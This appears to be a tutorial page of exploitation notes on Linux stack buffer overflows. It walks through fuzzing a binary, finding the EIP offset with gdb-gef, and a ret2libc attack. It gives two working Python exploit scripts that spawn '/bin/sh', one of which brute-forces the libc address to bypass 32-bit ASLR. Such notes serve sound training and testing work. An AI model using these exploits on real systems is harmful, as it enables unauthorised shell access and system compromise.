# Buffer Overflow {-}

## Windows Buffer Overflow {-}


## Linux Buffer Overflow {-}

### Check for BOF with python {-}

```bash
./program EEEEE

[*] Message sent: EEEEE


./program $(python -c 'print("A"*500)')

Segmentation fault (core dumped)
```

You can use the `dmesg` command to check more in deep what appends

```bash
./program $(python -c 'print("A"*500)')

Segmentation fault (core dumped)

dmesg | tail
```

### Get information of binary {-}

#### Basic binary enumeration {-}

```bash
file program
strings program
```

We can also use `readelf` to get information like functions and other

```bash
readelf -s program
readelf -s program | grep -i "FUNC"
```

#### Disassembling binary with objdump {-}

```bash
objdump -D program | less
```

#### Advanced Disassembling with radare2 {-}

```bash
radare2 program
aaa
s main
pdf
```

#### Check the security {-}

```bash
checksec program
```

This command let's us see what are the securities enabled for the program. There are important information outputed for this command

| Name           | Information                                                                                             | What that mean                                                                                                                             |
| :------------- | :------------------------------------------------------------------------------------------------------ | :----------------------------------------------------------------------------------------------------------------------------------------- |
| Arch           | Architecture 32b or 64b of the program.                                                                 |                                                                                                                                            |
| RELRO          | Relocation Read-Only                                                                                    | If enabled, means that the program use GOT (Global Offset Table) to resolve functions dynamicaly. Prevents some form of relocation attacks |
| Stack (canary) | Known values that are placed between a buffer and control data on the stack to monitor buffer overflows |                                                                                                                                            |
| NX             | Information of DEP (Date Execution Prevention)                                                          | If disabled, Shellcode can be executed from the stack. Otherwise technics like Ret2Libc are needed                                         |
| PIE            | Position Independent executable                                                                         |                                                                                                                                            |


### Usage of GDB (gef) for BOF {-}

#### Get information and offset of $eip {-}

1. Run the binary with gdb-gef

    ```bash
    gdb ./program

    gef> r
    gef> r EEEE
    [*] Message sent: EEEEEE
    ```

1. Disassembling the main function to get information

    ```bash
    disass main
    ```

1. We can also check the security from gdb

    ```bash
    checksec
    ```

1. Running with 500 A

    ```bash
    gef> r $(python -c 'print "A"*500')
    ```

    Normally we will be able to see that the $eip address will be 0x41414141 that represent 4 "A"

1. Looking for the offset needed to overflow the $eip

    ```bash
    gef> pattern create 100
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    
    gef> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

    gef> pattern offset $eip
    [+] Found at offset 52 (little-endian search) likely
    ```

    In this case the offset is 52 bytes in little endian.

1. Control by running 52 A and 4 B

    ```bash
    gef> r $(pyhton -c 'print "A"*52 + "B"*4')
    ```

    If we see that $eip address value is 0x42424242 that represent 4 "B" means that we have the control of the $eip


### Ret2Libc {-}

By checking the security of the binary we can see if **NX** (DEP data execution prevention) is enabled. If it's not the case
we can add our exploit script directly in the stack and put the address of the stack in the $eip. But if the **NX** is enabled,
we have to use other technics like **Ret2Libc**.

The **Ret2Libc** technic is a sequence of functions and commands that allows attacker to call the system function and generate a shell:

**Ret2Libc -> system_addr + exit_addr + bin_sh_string_addr**

Those necessary addresses can be calculated by adding the offsets of system, exit and /bin/sh string to the libc address. In this case we need first
to find the address of the libc library.

```bash
ldd program
ldd program | grep libc
ldd program | grep libc | awk 'NF{print $NF}'
ldd program | grep libc | awk 'NF{print $NF}' | tr -d '()'

#Output
0xb771f000
```

> [ ! ]Note: You have to be carefull and check before if the **ASLR** is enabled. We will check that in the next chapter.

We can then check the offsets of the system and exit functions

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@ | exit@@"
    
#Output
 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
```

Here we can see that *0003ada0* and *0002e9d0* are the offsets that we need to add to the libc address

Then we need to find the offset of the `/bin/sh` string in the libc library

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
    
#Output
15ba0b /bin/sh
```

Here *15ba0b* is the offset.

In this example, the addresses are:

- system = 0xb771f000 + 0003ada0
- exit = 0xb771f000 + 0002e9d0
- /bin/sh = 0xb771f000 + 0015ba0b

And a python exploit can look like the following

```python
#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

offset = 52
junk = "A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc = 0xb771f000

#141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
#1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
#15ba0b /bin/sh

system_addr_offset = 0x0003ada0
exit_addr_offset = 0x0002e9d0
bin_sh_addr_offset = 0x0015ba0b

system_addr = pack("<I", base_libc + system_addr_offset)
exit_addr = pack("<I", base_libc + exit_addr_offset)
bin_sh_addr = pack("<I", base_libc + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr

ret = call(["/home/user/program", payload])
```

#### Check if ASLR is enabled {-}

**ASLR** or Address Space Layout Randomization is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities.
If **ASLR** is enabled, that means that the libc library address will change every run. You can check if **ASLR** is enabled with the following command.

```bash
cat /proc/sys/kernel/randomize_va_space

#Output 2
```

As the output is not 0, that means that **ASLR** is enabled, you can verify that with

```bash
for i in $(seq 1 10); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done
```

And you can see that the address change every time.

In some cases, more specificaly when the computer architecture is in 32b, attacker can try to make a collision of one of those addresses. If you check
that with the command:

```bash
for i in $(seq 1 1000); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done | grep "0xb7568000"
```

> [ ! ]Note: In this case *0xb7568000* is a copy pase of one of the addresses found in the 10 loop command.

As you can see, the address comes multiple time. that means that we can bruteforce an address to bypass the **ASLR**

```python
#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

offset = 52
junk = "A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc = 0xb7568000

#141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
#1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
#15ba0b /bin/sh

system_addr_offset = 0x0003ada0
exit_addr_offset = 0x0002e9d0
bin_sh_addr_offset = 0x0015ba0b

system_addr = pack("<I", base_libc + system_addr_offset)
exit_addr = pack("<I", base_libc + exit_addr_offset)
bin_sh_addr = pack("<I", base_libc + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr

# Lanzamos el bucle infinito hasta que la direccion sea la buena
while True:
    #lanzamos el subprocess y almazenamos el codigo de estado en una variable ret
    ret = call(["/home/user/program", payload])
    # Si el codigo de estado es exitoso salimos del programa
    if ret == 0:
        print("\n[+] Saliendo del programa...\n")
        sys.exit(0)
```

With the while true loop and by checking if the return code of the subprocess call function is successful.

